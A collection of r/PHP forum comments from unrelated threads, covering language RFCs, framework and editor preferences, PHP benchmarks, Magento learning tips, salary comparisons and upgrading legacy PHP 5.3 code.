Nothing wrong with the immutability RFC. If you wanted some example of "we really didn't need it", you could have taken `&lt;=&gt;`.
I set up my old instance of Laravel that had to be in the root (shared hosting) with limited credentials. They only had access to the needed databases, and only had access permission to the web server IP. I can't remember what my .env publicity safeguard was... Think I moved it to a custom directory and restricted access to it.
Instead of complaining, how about getting involved yourself or sponsoring a feature you want by paying someone to implement it?
Environment variables can be leaked by a forgotten phpinfo(), error messages (when set to dev), error logs accessible from web, etc. .env file shouldn't be in your web root anyway, and it's also not exposed by default in Apache (but not Nginx, AFAIK).
[removed]
Yes, I have seen the RFC, what I don't see is the point. We have class constants, would that not be the same? Alternatively use short-syntax so that `const MY_ENUM;` would translate into `const MY_ENUM = "MY_ENUM";`?
&gt; A good engineer should know and understand the implication of the approach to the solution. You're thinking of the engineer writing the app. What of the engineer writing the framework? They're out of the equation? Why? &gt; The next thing you are saying is an engineer does not need to understand sanitizing input or how to prevent a sql injection attack, the framework should baby sit all of these for him. Ideally it should. That's the whole point of these tools, minimize errors, maximize productivity. Talking of which, I've never heard someone use the phrase "sanitize input" who actually knows how to work with input. So I guess you're in the same group with the folks you're laughing at.
&gt; It is for production, where do people get that it isn't? It isn't in the manual because it's pertinently false. Well, there we go, you're demonstrating my point up there excellently. And with that I conclude my trilogy of comments titled "Good intentions don't count. Only results count."
I really don't like this blog format where a guy essentially starts an argument with tweets.
&gt; Well.. its php.. you cant have nice things here A few things: Simplified password API CSPRNG Simple and secure-by-default modern cryptography Looks to me PHP is showing the way here.
Oh no no no... I'm a rocket man
&gt; It's why I hate being the sole developer - having someone make you explain your work helps you find bugs and flaws in reasoning. I have to agree. When I was the sole programmer in a company I'd end up just going to the network engineer or HR person and start describing my issue and why I have no solution, then stop half way through as I realised it and went back to my computer. Working with other programmers is great, but I do miss half ranting about something no one else understands and then walking away
&gt; Because PHP is not language that we need, but one that we deserve. That's why instead of RFC about pipe operators, enums, generics and so on we have this. What does that mean "instead we have this". "This" is a RFC. Pipe operator, enums, generics and so on had their own RFCs. Or are you just ranting about nothing in particular to no one in particular? Bad day at work?
&gt;https://wiki.php.net/rfc/immutability whew lad I don't think I've ever seen a more clear failure of a person's inability to grasp basic OOP concepts than that. Thank you for showing me this.
Try running a commercial company and then pulling stuff like that. It defiantly stops any company that wants to stay on the good side of the law. Individual users have no fear because who is ever going to come after them. No worth the money and time. Companies on the other hand ... So yea, it definitely stops some.
I agree with you that the original problem in the thread is the server configuration. I don't agree with using the .env files in production though. I use them in every environment but production. Production uses the values in the config files. The .env file is used to override those values in other environments. 
You could use http://www.php.net/manual/en/class.splenum.php ?
be very grateful, I still have the odd non composer website land in front of me and it's so painful, worse so is when it's a mix on non-namespaced code and namespaced code.
Slightly off topic, but from the atoum GitHub page: &gt; atoum absolutely requires `PHP &gt;= 5.6.0` or later to work. On UNIX, in order to check whether you have the right PHP version, you just need to run the following command in your terminal: &gt; &gt; `$ php -v | grep -oE 'php 5\.3\.(?:[3-9]|[1-9][0-9])|5\.[4-6]\.[0-9]+|[5-7]\.[0-9]+\.[0-9]+'` That regex though.... Why not? `php -r "echo PHP_VERSION;"`
I respect php because it works and was there when developers and businesses needed it. But it not simple, modern or secure by any mean. It is ugly, not DRY at all, has an history of security bugs, a lot of out dated legacy stuff, and disgusting comparison operators / functions. And this is just a few flaws that came to my mind in 20 seconds, there are hundreds of them. 
That's a fair remark. Would you like to try a PR :-)?
&gt; But it not simple, modern or secure by any mean I don't think this is true. If you look at the three points, all of them are something which makes hard shooting a bullet at user's own leg. For example, the modern crypto API is something which is currently missing from all other major languages. So to say, in this sector PHP is hands down top notch.
Well that's a good thing
How does that make sense? How do you want to put an XML file (like for PhpUnit) into a PHP file?
&gt; disgusting comparison operators / functions Do you mind expanding on this?
I think there is a chapter about those here (https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/). It is from 2012 so some parts can be outdated. 
Oh, you men the strictness or lack thereof in comparisons?
I quote: Comparison isn‚Äôt much better. It‚Äôs not even consistent: NULL &lt; -1, and NULL == 0. Sorting is thus nondeterministic; it depends on the order in which the sort algorithm happens to compare elements. The comparison operators try to sort arrays, two different ways: first by length, then by elements. If they have the same number of elements but different sets of keys, though, they are uncomparable. Objects compare as greater than anything else‚Ä¶ except other objects, which they are neither less than nor greater than. For a more type-safe ==, we have ===. For a more type-safe &lt;, we have‚Ä¶ nothing. "123" &lt; "0124", always, no matter what you do. Casting doesn‚Äôt help, either. 
If you run npm as sudo. If you're running npm as sudo, you have bigger problems.
Except that most **decent** shared hosts offer ssh access these days. Sometimes you have to open a support ticket, but they will usually give it to you. This is not 2002 anymore.
Why are you in /r/PHP ?
Such a great tool that is so easy to take for granted since it's so seamlessly integrated into the best PHP IDE out there. 
Item 3. Caveat: LIMIT / OFFSET is not good for performance (with large result sets) (in MySQL). For more details see: https://use-the-index-luke.com/no-offset Also missed: Knowing how your DB works and how to profile DB queries and construct schema, indexes and queries properly is just as important as knowing the programming language (PHP) A large proportion of performance problems you'll encounter are in the database rather than the code
Yeah IT broke unit tests on my company. Some unit test was old. They were extending by phpunit_framework_testcase.
First graph says the data is: &gt; WordPress 4.9.4 PHP 5.6 benchmark results: 49.18 req/sec WordPress 4.9.4 PHP 7.0 benchmark results: 133.55 req/sec WordPress 4.9.4 PHP 7.1 benchmark results: 134.24 req/sec WordPress 4.9.4 PHP 7.2 benchmark results: 148.80 req/sec üèÜ WordPress 4.9.4 HHVM benchmark results: 144.76 req/sec But shows HHVM as worse than PHP 7.0 and 7.1.
Well, the way I detect high memory usage is I set my memory to a conservative minimum during dev time. If it crashes with "out of memory" then I'm doing something wrong (or I need to reconsider my script requirements). Regarding time, I wouldn't say we have to *ignore* it, it's just that it doesn't provide interesting enough information most of the time. However both those indicators can be useful for overall production stats, to catch some problem that happens in the moment while the app is running, as running a profiler on production is typically a bad idea.
You are right about the resources, but I found that not many web developers even with years of experience worry about them until application grows, which might happen when someone else is taking care of the project. I worked with multiple people over the years, but only a few knew how to check RAM usage in PHP script. 
Thanks for the read about offset, I'll check it out. Database is a big topic, apart from what you wrote there are also differences between SQL, NoSQL and how they can affect performance. In my experience I find that when you have to optimize your PHP application because of unexpected growth, you can't really change schema cheaply. Indexes, better queries - sure. Also my experience differs in terms of performance problems. It is true that poorly defined tables and relations can result in horrible queries and slowdowns, but if you hit PDO from your PHP for data 10000 times, you will feel it even with indexes. Thanks for feedback!
&gt; "Something wrong" when hitting out of memory is a very vague statement that can be specified with get_memory_usage() very quickly. :) Well, when you hit out of memory error, you get a stack trace and can see exactly where it happened. Of course the culprit may be earlier, but it's a nice starting point. &gt; For me, it is a common practice when creating heavy console commands or cronjobs to start and finish with microtime so I can put it in the log file, or send me a notification if it runs for longer than expected. Nothing bad in that.
Actually, when you hit out of memory error you get exactly what I showed in the article, no stack trace.
With Xdebug you get a stack trace on everything, including memory limit errors. You seem to be writing CLI commands which are more memory heavy, and therefore you hit this problem more often. That could explain your focus on memory management. Frankly, I only care for memory problems in web apps, where they are rare to begin with. On CLI I just give it plenty of GB and don't care.
Oops, these have been fixed :) Will show up once cache clears. Thanks for the heads up.
Oops, these have been fixed :) Will show up once cache clears. Thanks for the heads up.
I'd like to commend the PHP team on their efforts. I remember when HHVM came out and its performance blew my mind, but I couldn't bring myself to jump ship. I held out and we get benchmarks like these. Great job, guys/gals! Looking forward to the future!
Imagine if Facebook decided to work on Zend Engine and port Hack to it... Sigh.
Nice effort on benchmarking so many configs. Was opcache turned on for these?
Thanks, that's what I was hoping for too. Any good resources to get upto speed?
Could you elaborate on why you think this is a bad proposal?
Thank you =) Seems we are on the right track.
Fair enough. I personally use strict typing and strict comparison, and the other issues have ways to do them properly, but I agree those parts of the language could use some improvements
Setup xdebug so you can debug the code. That‚Äôs what I did the first two weeks working with Magento and I think it‚Äôs the best way to get started. Unfortunately Magento is really complex (overengineered?!) and it will take some time to get familiar with the software.
You can speed through [laracasts free intro to PHP videos](https://laracasts.com/series/php-for-beginners). They're still generally applicable. I wouldn't spend too much time worrying about the Zend Framework. Just make sure you have the basic idea of how it works. After that I would suggest a book or something for Magento. I can't give you any good suggestions because I haven't used Magento in a few years.
https://github.com/laravel/framework/blob/5.6/composer.json#L40
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [laravel/framework/.../**composer.json#L40** (5.6 ‚Üí c466c77)](https://github.com/laravel/framework/blob/c466c775a0abcd6234dda8dbcae36bd4b2003182/composer.json#L40) ---- 
Every wordpress job I've ever been asked to look at started with the _client_ choosing a **shit** shared host a year before they asked me for help. I've never successfully convinced one to change hosts (because they already several other wordpress installs on the same host that have no problems) or pay for ssh (because they won't ever use it) or even just submit the info the host is asking for to get free ssh (https://www.name.com/support/articles/205935367-Requesting-SSH-access) because they don't understand why any of that is necessary and they're already trying to either pay me half of what I asked for or trick me into doing more work for the same pay.
Why should I use this over PHPCS with the PSR2 standard? No snark - genuine question. Or, do they compliment each other?
Good point, thank you, not the case in my instance. My nginx default site is a simple html template in its own sub directory. 
Php Inspections (EA Extended) is more about finding bugs and language level migration, than CS. Plus analysis is running on the fly and Quick-Fixes can be applied - an instant feedback loop, higher velocity. We got lots positive feedback, but a negative one taking place as well (people mention the analyzer is opinionated). Worth trying, installation is very simple: https://github.com/kalessil/phpinspectionsea/blob/master/docs/getting-started.md 
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [kalessil/phpinspectionsea/.../**getting-started.md** (master ‚Üí fa640b0)](https://github.com/kalessil/phpinspectionsea/blob/fa640b07c1e68c7755c8c7cf5cf50fb0798b8a07/docs/getting-started.md) ---- 
Can't say more about laracasts. I point all my team to it if they need to catch up. Magento is another story. Learn their folder structure, because it's convoluted. Folder within folder within folder. But when you understand it, it's not that bad.
Minor nitpick, but React is a view library and Node.js is a runtime
plain php is faster than all of these 
so your saying i should learn a framework
I bet your coworkers love when you review PR‚Äôs
Coworkers? I'm a team of me.
What does that make angular?
Yeah, you can make it work for sure, but those core elements should not need tweaking I think too
If you read PHP source code you can probably decipher it without knowing how to write it if you already know CFScript and Python. I'd suggest reading some of the [Symfony code](https://github.com/symfony) to see a good example of some complex but well-structured PHP. Then just kind of google "PHP" + whatever function/class you don't know for more info. That's how I learn stuff...
A framework?
PR? Merge branch to master and push! Seriously though, I do try to keep a discipline and do PRs for everything.
&gt; Got a new job where I need to work with Magento My condolences. 
Read First: https://www.citusdata.com/blog/2016/03/30/five-ways-to-paginate/ (Postgres based article, but covers stuff applicable to other DBs too, also includes statistics of query times for tables with a few thousand records vs. millions). Read Second: https://use-the-index-luke.com/sql/partial-results/fetch-next-page (click the tab that applies to the DB you are interested in)
Yes, probably I should use "mixed" typehint or "scalar" as an example...
&gt; overengineered Magento is incredibly both overengineered and underengineered at the same time. The quality of its code varies wildly from module to module. 
You need to know very little of Zend Framework in order to work with Magento. There's only a handful components cherry picked. If you're starting with Magento 1, try the book "Grokking Magento". If it's Magento 2, try to get a hold of a ticket for a Magento sponsored workshop or some learning material from your new job, for M2. Good luck
When almost every comparison is between raw PHP and a Framework from another language, probably should. If you switch to another language you're probably only going to be using frameworks.
I've been away in Ruby land for a year. Has testing improved? Codeception was a really great tool but some PHP code was just untestable
Would be nice if the article included how the environment was setup as well as the actual source code used for testing.
I worked with a hotshot dev that did stuff like this all over the code. The boss thought he was a genius and was letting him add all kinds of libraries to our base libs. This stuff would be fine in Python or Java, but it doesn‚Äôt work out well in PHP. Try to learn a languages culture, don‚Äôt just code in the &lt;my previous Jobs language&gt; way.
It is Soo much better than 10 years ago technology wise but lags about 20k salary wise according to indeed https://www.indeed.com/salaries/Ruby-On-Rails-Developer-Salaries
Interesting stuff! For folks' reference, [here's the stats for PHP developers](https://www.indeed.com/salaries/PHP-Developer-Salaries) Looks like calling [yourself an "engineer"](https://www.indeed.com/salaries/PHP-Engineer-Salaries) earns you about $16k more per year ;) But still not as much as a RoR dev... I wonder how much these numbers are skewed because more developers start in PHP than in RoR, which would bring the average salary for PHP down, relatively speaking. But considering that the upper limits are higher for RoR, it might not be much of a factor.
Likely coding is done offshore where the quality is as good as it needs to be. If nobody checks it then its good enough.
An ini file is more readable than yaml and less error prone.
I did my first PR the other day just for the heck of it. I approved it and merged it too. After years of running solo and live-editing PHP on the production server.
Hopefully I can get approval from my university to work on parameter contravariance and return type contravariance for course credit. This would allow me to allocate more time to PHP development than I currently can. After that feature I would work on parameterized types aka generic types. So... here's to hoping I can contribute to making it even better in PHP 7.3/8.0. 
Person listed in the authors section speaking. Personally I prioritized other things which, unfortunately, did not work out; short closures are one such example. Even now I'm still prioritizing other things, namely parameter contravariance, return type covariance, and parameterized types (aka generic types).
A big part of the salary difference is that PHP has a huge skill range between wp hack to Facebook architect and telling the difference for a non technical HR pro is really hard. However, ROR is a PITA to get started in so it is self selecting for more skilled talent. Also PHP frameworks have lagged behind rails and Django to actual productivity lagged as well. This sounds more authoritative than it should, I am just some guy on the internet with an opinion.
Those salary charts are useless outside of major cities. I've never come anywhere near six figures.
That last point is one of the reasons I managed to get my (formerly very PHP-centric) company to branch out and use JS (Node) where it makes sense. We looked at Python and Node, and the latter won out in part due to the fact most of our devs are already familiar with it. PHP 7 + the modern tools / libraries available is definitely a lot more enjoyable to work with, though I find less and less areas where PHP isn't outshined by other alternatives.
Symfony 4 Flex and Angular is a killer combo in my opinion. 
The Angular internals team call it a platform I guess they should specify a client side application platform
Sorry to hear that 
You're a god sir, much appreciated work. Regarding generics, are there any plans to backport them into the stdlib? A generic array would be cool, not sure how that would be type checked at runetime though.
Do you also walk uphill through the snow to work and back? Seriously though. Why?
Everything achieved by the concept of an immutable class is already possible through proper class design. The RFC gives the reasoning of not being able to change the state of the object without developers being aware, but that is already the case unless a properly encapsulated class is edited to not be so... the `immutable` keyword suffers the same weakness, and thus solves no real problem. The RFC also *introduces* a new fatal error through a common access method by making instances of a class crash the script when a `public` property is edited, which just screams bad design to me.
Came here to say the same thing. When I see Magento in the job description I bounce. However, for the OPs sake, you might be working with some talented engineers who really know their way around Magento. For your sake, I hope that is true and they can guide you through hell. Learn what you can from those people.
I intend to parameterize interfaces such as `Iterator`, `IteratorAggregate`, and `ArrayAccess`; that last one in particular would greatly benefit from type parameterization. In order to preserve backwards compatibility this requires parameter contravariance and return covariance and are valuable even without generics which is why I am working on that first. Arrays are complex and I do not think they will be touched in the initial implementation.
How is it possible that Laravel 5.4.36 is around 3,5 times faster in HHVM then PHP 7.2? HHVM and PHP 7.2 are much closer in all the other tests.
To be honest, rails is too implicit for me and Django is too much configuration over convention. I feel that Laravel is an amazing middle ground. 
That‚Äôs a subjective point of view.
I use [VSCode](https://code.visualstudio.com/), the git integration is helpful (plus they just added Submodule support). Extensions are nice, if you want them. VSCode doesn't just have to be used for PHP, and it's free.
Best IDE!
That's true, your tips are all true. The thing is just, they're kind of obvious. No experienced developer in his/her right mind would make a script doing 10k queries that could have been wrapped in one. So if that's the kind of things you run into, I wouldn't really call it performance optimization, I'd call it "not being an idiot". Real performance improvements are often very subtle and involve lots of reading, benchmarking and really understanding what's going on under the hood. But it's often much cheaper to just scale up the hardware than doing real research to performance improvement. As long as you're not "being an idiot" it's not something you usually have to worry about.
I think you are right, it seems mostly experienced developers are on /r/php and I have chosen the title poorly. It's clear I have posted it in a wrong place, I'll remember that for the future. However I wouldn't call people idiots just because they might not have run into some issues yet. When you make applications it might not even be an issue for years after you start, that you are query looping relations with your framework models.
I don't think you know how to use it then, buddy.
Not this thread again. Just search this subreddit or look at the stackoverflow survey https://insights.stackoverflow.com/survey/2017#technologies-and-occupations for some insight
I use GNU Screen and Vim. High learning curve, but worth it. I like being able to SSH from anywhere (including my phone) and use any CLI program (like PHPUnit, MySQL monitor, and just general BASH programs), and being able to write my own tools, whether code generators or otherwise, all in one environment. Of course, it's not a one-size-fits-all. My mind works in some weird way that Vim and CLI tools work really well for me, and regular IDEs drive me up the wall.
&gt; Best ~~IDE~~ Editor! sorry, couldn't resist.
This benchmark uses db on Symfony, since the one on phpbenchmarks is called Hello world, it may just display static text.
Pretty much the same as any OSS that doesn't have a dedicated team of reviewers :)
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
The next release after it was introduced, we turned it off by default =) So when people just starting to use the plugin they need to enable it (relevant to Yii2, CraftCMS, Laravel communities).
My PHP working, Haskell loving self would love you.
I used to use [Geany](https://geany.org/), but have since switched to VSCode because of it's extensive amount of plugins.
Other than the money, I have to agree! Sadly because PHP is an entry language for many, it drives the average salary right down.
I share your point of view, but Array and objects have been different things in PHP since always, maybe to make Array implement Countable, you would need to make array become an object first, and a lot of code would break on the is_object() | is_array() checks 
Don't you mean return type covariance?
Sorry if it's not the right place (it probably isn't) but since you're here I have an idea for a new rule: We recently fixed a bug involving `if (!empty($var-&gt;something))` where `$var` was not existing in the scope. It was obviously a mistake on our side and detecting it with static analysis would be awesome.
Interesting thoughts, though I don't necessarily agree. I think immutably is a good thing as it helps ensure predictable outcomes and catches mistakes, though maybe this RFC didn't quite nail it. Perhaps it should function more like the final keyword in Java?
Well, my team doesn't use composer either since we barely use any external libraries (the few we have was added maybe less than 2 years ago) and the dev adding them didnt know about composer and only a few classes that the seniors want to remove for whatever reason that never been explained to me (procedural only ftw?). My boss didn't like that I added a namespaced class together with a simple autoloader for the support classes and libraries I needed. Funny thing is that I had a short briefing on what the library was doing and how but no actual code check and he didnt notice it until I checked his code that used the underlying DB and mentioned he should use the functions I wrote instead of modifying the database directly. Not using composer is not the biggest problem in this codebase to say the least. A problem with not using composer is that I cant run tools like psalm easily
Your suggestion would have merit if arrays were objects. But they aren't, they have entirely different passing semantics and do not behave like objects in any other way. Making them pretend like they implement Countable would be rather foolhardy unless they were made to behave as objects on a much more fundamental level.
If it were implemented I don't think this RFC is the proper way to do it. However I don't particularly think this type of immutability should exist in PHP - I think it's more appropriate for compiled languages. Personally, I would rather see specific immutable data structures added to PHP instead, such as python's `tuple`.
That's what "privilege escalation" means. It means you have privilege, and you escalate it.
&gt; Makes it easier to look into languages like React and Node.js. Classic PHP dev
VSCode. Has some good plugins for developing. Its is light and fast.
Alrighty! `@/usr/bin/chromium-browser --noerrdialogs --disable-restore-session-state --incognito --kiosk "https://my-url.com/index.htm?mapId=123"` This one works perfect!
I created a ticket: https://github.com/kalessil/phpinspectionsea/issues/833 Also please be aware that we have split scopes of Php Inspections (EA Extended) and Php Inspections (EA Ultimate): https://kalessil.github.io/page-blog-post-about-ea-ultimate.html
better remove it from here and re-ask it in /r/phphelp, it will be downvoted and removed anyway
Obsolete. 
It is better now but getting a local Dev environment going on a win machine, and setting up a production environment is a bigger hurdle in the ROR world.
&gt; Making them pretend like they implement Countable would be rather foolhardy unless they were made to behave as objects on a much more fundamental level. I'm in. Let's make them behave as objects on a much more fundamental level. I want them able to implement interfaces, have types, and methods. Keeping the passing semantics. Precedent: Swift's structs.
I would say PHP is one of the laggards. Many of the updates it's done in 7.x are it playing catch up with the higher funded languages (such as Java and .Net). I have to move away to Node/Go for anything async related (usually only for larger distributed systems heavy on I/O). PHP's hacks and so forth just feel, well, like hacks! Oh and everyone can code in PHP! Apparently you don't really need to learn it (similar to JavaScript) :/ Which pulls down salaries for PHP, but Reach/Angular and the innovation around mobile push salaries very high for JavaScript. Don't get me wrong, I love PHP and have done PHP for many years. But, I get a sense of it merely playing catch up and for those only exposed to PHP. Feels like PHP is amazing to them! And PHP is generally restricted to web unlike .Net, Java, etc that provide more application in the commercial world. Just my opinion of course. No offence if no one agrees :)
Correction: NodeJs is not a language, but a JavaScript runtime.
&gt; " &gt; *other languages like React and Node.js* &gt; " ü§î
And libraries are great for when you want good security. No way would any login system I create be as good as what laravel comes with out of the box. Add to that all the optimizations already done on tools like lodash, and all the responsive DOM features of something like Vue.js, and the templating power of blade all means I'm not just writing *better* code, but I'm also doing it quicker. The only downside is the time it takes to learn enough of a framework / library before you're able to actual take full advantage of it. But the way I see it, why reinvent the wheel, when someone else has already created a car that you can use? (That doesn't mean don't learn the fundamentals though, I believe you should at least have a basic understanding of how your car works before you go showing off your driving abilities).
You need to write code so that it is testable to begin with. This is true on any language.
Where do you live? I live in Nebraska and even here there are 6 figure developer salaries for the senior level people and this is a very low cost of living area. It's definitely the top end of the market, but not unheard of by any means. I should clarify though this town is almost entirely .NET and Java. PHP basically doesn't exist here. Also don't forget about remote jobs. If you can land a big city remote job working in a low COL area you'll be set. 
From time to now I've seen the frontend matter to try to suppress backend guys with things like Firebase, Node and similar. How PHP will adapt to this possible future?
why do you seem proud of that lol?
VSCode with extensions (PHP DocBlocker, PHP Intelephense, laravel-blade)
I cannot wait. I can't help but feel that these are the last two things the language is missing.
But Magento does. It‚Äôs run by a company with a product team. 99% of the source is written by people who work for Magento. 
Yes; fixed.
Does it have the same refactoring tools?
Cool, the RFC basically describes how to polyfill it too. üëç
Gah, not this again `;-)` (The real answer is that "best" is highly variable and subjective).
I'm not sure how much of the code we could replace with libraries, but if we could I would try to do so. I've been pulling in some libraries lately for basic functionality that is still cumbersome to write by ourselves and the PHP stdlib is bad at. 
A mix of different reasons, I just haven't decided what to do next, but soon^tm
Build shit
masochism right there
The basics of oop and design patterns is the best. Sometimes frameworks are decided by companies.
You can also code extensions for your framework for it, e.g. https://github.com/dereuromark/cakephp-ide-helper/ plugin for CakePHP. This makes the IDE and PHPStan understand all the shortcuts and stuff, providing full typehinting and maximum code-auto-complete.
meh, this being r/php I expected this to actually show code for defining your own block plugins for Drupal 8, not a guided tour through making one with the Drupal UI.
Somewhat separate, but, FWIW, a "rails 5" ecosystem has much more in it than earlier iterations. To some degree all frameworks have this, but I can say I did some Rails in the v2 era, and did one project right when 3 was coming out. Looking at 5, today... there's just so much more to be conversant with than earlier that I think a 'getting started' process is more daunting. Some of that may be alleviated by particular tutorials or guides, but... there's a lot there (generally good, but can lead to more ramp up time for folks just getting started). My friends that went from 2-3-4-5 are fine. Me jumping in to 5 from the 2 era... I felt overwhelmed (and ultimately didn't do that project in Rails at all). just a small exasperated rant...
You can leverage stripe's API to create a subscription feature in your application. You might want to Google stripe php subscription.
You'd only get opinionated answers here. 
Oh. Oh dear.
I don't see what you mean?
Whichever the client/company you're working for asks for, OR if you have the option yourself (which is fairly rare, unless you only work on greenfield development), whichever you can get the job done in the best time and most competent way.
&gt; Why not? php -r "echo PHP_VERSION;" Why not just php -v and read it? 
the one that is right for the job at hand based on the client or jobs specifications.
I have been working on a library to create constraints for coupling between modules (namespaces) in a project. It is inspired by the idea of Fitness Functions introduced in the book [Building Evolutionary Architectures](https://www.thoughtworks.com/books/building-evolutionary-architectures) and similar functionality offered by JDepend. The core idea of (DependencyConstraints)[https://github.com/kajstrom/dependency-constraints] is to automate checking for unwanted coupling. As an example let's say you want to protect your Domain layer from being coupled to your Application layer. For this purpose you would create a test in PHPUnit some other testing framework. $dc = new DependencyConstraints("path/to/my/src"); $domain = $dc-&gt;getModule("MyProject\\Domain"); $this-&gt;assertFalse( $domain-&gt;dependsOnModule("MyProject\\Application"), $domain-&gt;describeDependenciesTo("MyProject\\Application") ); Now every time your tests are ran you get immediate feedback if unwanted coupling is introduced.
Oh, surely not the last two. As a web-focused programming language we probably need better language support for asynchronous operations. And, once we have generic types we'll probably also want free-standing functions that can be parameterized by types as well, and to avoid verbosity we'll probably want type inference.
Having upgraded a very large project from 5.3 to 5.6 I can say that it is possible. But if you have any old MySQL functions being used you'll need to update them. Going to 7.2 directly is even harder as they've changed the way foreach works. So I hope you have tests. 
all the mySql stuff we have is at least mysqli and I have been converting as much of it to PDO as I can.
How do I know if I'm building it correctly?
Don‚Äôt worry about that as much. You‚Äôll continuously improve and iterate as you grow. Don‚Äôt be paralyzed by fear of imperfection, it will only hinder your growth. 
That isn't my concern right now but I'm learning intermediate OOP and it is so hard to learn when to use what pattern or idea. I feel like it's hard when at work I'm in a procedural setting.
Patterns are a tool, not an answer. Don‚Äôt try and force them where they don‚Äôt come naturally to you. It‚Äôs good to read about them and try to think of where you can apply them, but they‚Äôre not an end all be all answer for every problem you have. 
Thought the same thing, PHP_VERSION is identical or at least very close to what the regex is doing.
Yeah. It also feels like there's not enough time to read, watch instructional videos, and build shit outside of work while also doing anything else. Maybe that's just because I'm in a rush to get a new job where I can actually implement OOP and use version control and MVC and a framework and not work on pure spaghetti code. I guess I'm just rambling at this point but thanks for your help. 
Let me know if you ever need code review!
Stripe works but if you want PayPal Braintree might be the better option. You should look into spark, which is basically a subscription based app out of the box.
I'm guessing he means the deprecation of each(), which for a long while has been vastly inferior to foreach. And to be honest, I haven't seen used in some time now. Also, unless you're doing something really specific with your code, you can probably change it easily.
When JQuery was gaining popularity, I immediately swore off all these types of general Javascript libraries. Over time, I extended this to include React, Angular, Python, node.js, composer, the PHP 'class' keyword and lots of other stuff. Your life is filthy, Mine is Pure. I think it's because I just don't like to change :)
The biggest changes were from 5.3 to 5.4 and then from 5.6 to 7.0. 7.2 isn't much different than preceding 7.x releases. I would upgrade yourself step-wise, skipping only a few versions each time. Personally, I would upgrade as follows: 5.3 -&gt; 5.4 -&gt; 5.6 -&gt; 7.2 For each upgrade, upgrade your dev box, then upgrade your dev server, then staging, followed by production. This way, you have the greatest chance to find and fix any upgrade issues. Try to get all of the way to 7.2, so you're as well positioned as possible should your employer lose the will to upgrade again in the future. Once you're up to date, try to get them used to there being an upgrade cycle. Each version of PHP seems to last two years before going security-only and lately it looks as if there's a new release each year. So set aside some time at some slow point of the year, each year, and get yourself to the latest stable. The rest of the year, keep your code modern and position it so that the code can run on the next version without a hitch. This way, the upgrade process is as smooth as possible. Most businesses put off doing upgrades for fear of breakage and because the overall effort can be large. So the upgrade just languishes and the effort to do an upgrade continues to pile up. It's short-sighted, but it's the way people function. They also don't like surprises, which is why it pays to make staying up to date a planned habit. Keep ahead of that, and you'll find resistance melts away.
Use the right tool for the job. What are you trying to build? Start from here and pick a framework (the tool) which suits your task best. All major frameworks have their ups and downs, slightly different coding styles and different approaches to same problems. Personal recommendation - focus on solving the problem instead of choosing a framework. Your question sounds like this - "which hammer is the best?" Nail hammer? Sledge hammer? Automatic? :)
Oh, there's always more to do. Those are the biggies to me. I also really like Java's ability to cast anonymous functions to single-method interfaces. This combines the ease and conciseness of an anonymous function with the assurances of an interface. Example: `interface Fooable { public function foo(string $who): int }` `function setFoo(Fooable $foo) {}` `setFoo(function(string $who): int {})` Under the hood, I think it just takes the anonymous function and wraps it into an anonymous class that implements the named interface.
Southern Oregon. Pay across the board is really low. I searched and applied for remote jobs for months with very few hits. Eventually one has to take one can get to pay the bills. I can't leave due to family. It'd be a whole lot easier to find work in Portland or Seattle.
I bet you don't do side effects either. Your code is a black box with no windows. You have no idea what it's doing but it doesn't matter because it does it beautifully. A cheeky haskaler. A true artisan.
:D
Sounds like you're fighting both a lack of available jobs, and a low cost of living driving down wages at the same time. My town is the latter, but not really the former. I'm lucky that there are plenty of developer jobs here despite it being a relatively small city in the Midwest. If you're fighting the double-whammy of low wages and low numbers of jobs, then a remote job is probably your only path to a nationally competitive salary. The good news is that there are tons of remote jobs and more opening up all the time. The bad news is that the very nature of remote jobs makes them much more competitive. Just remember, the best time to look for a job is when you're employed. Keep searching and applying. If you're senior level talent, there's a place for you somewhere that will pay you for it. I stayed at a local job here for way too long. 9 years. After 9 years of full time software development I was making $19 per hour. Yeah, that's under $40k annual. With profit sharing bonus it usually came to about $50k, but still, not much for a senior level dev. I finally realized that if I ever wanted to get paid fairly I had to start advocating for myself, playing the market, and make a change. I picked up .NET instead of the PHP I had been working on and started applying. Landed myself a $72k salary .NET mid-tier developer job locally. After a year and a half of that, I realized I should strive for the senior title, and stumbled upon a Stack Overflow job ad for a remote senior .NET engineer position and applied. Somehow... I made it through their grueling interview process and received an amazing offer. In 2 years I went from $19 per hour to, let's just say a nationally competitive senior engineer salary that's definitely in the six figure range. It certainly was't the only job I applied to, but eventually one of them gave me a chance. You can do the same!
It's possible to upgrade from 5.3 to 7.2, but a lot will depend on your existing codebase. I've done 5.3-&gt;5.6 (which breaks a few things) and 5.6-&gt;7.1 (which hasn't broken anything to date) several times. The best thing to do is spin up a virtual machine with 7.2 and try running your code in it. Most of the things which break will break loudly and obviously (i.e. they'll give you a blank page or error message rather than subtle differences). You'll probably also want to use this opportunity to upgrade any third party libraries you have, which again may break things (Smarty caused a lot of problems for me when going from 5.3 to 5.6).
Stripe are great. Braintree are OK although are essential for PayPal. If I were using laravel I'd seriously consider using spark over rolling my own. I've also heard good things about chargebee.
read the changelogs, it's all in there.
mysqli doesn't ensure it will be okay, the newer versions of the mysql_real_escape_string require a connection to work now. 
I've been working on a project in 5.4 and we've used [PHP Compatibility](https://github.com/wimg/PHPCompatibility) to find issues. It's worked pretty well.
MySQLi still works on 7.x, just so you know. Convert to PDO if you find it easier though - many do. 
Use Notepad++ to Search in Files for each deprecated value.
I've always heard things said along the lines of "Don't ask questions that you really don't want the answers to". With that being said, if you are prepared to cringe... oh man I don't even wanna say it in public; * No version control * No testing * No Dev server * All live all of the time, and terribly scary. The tech is old and poorly taken care of and basically if the thing ever dies, we will have to build it anew from the ground up. Which, might be ok if not incredibly wasteful, to get the inherited spaghetti code out and some more formal code organization in. Is it always awful to inherit the work of others?
I love these threads. Company ignores codebase and accumulates huge technical debt... until security updates require the latest version... yielding management in a position where they have to invest again... at the expense of the poor programmer which needs to find and deal with runtime errors until they quit.
I'll drink to that. Cheers.
It's so bad that I'm actually impressed.
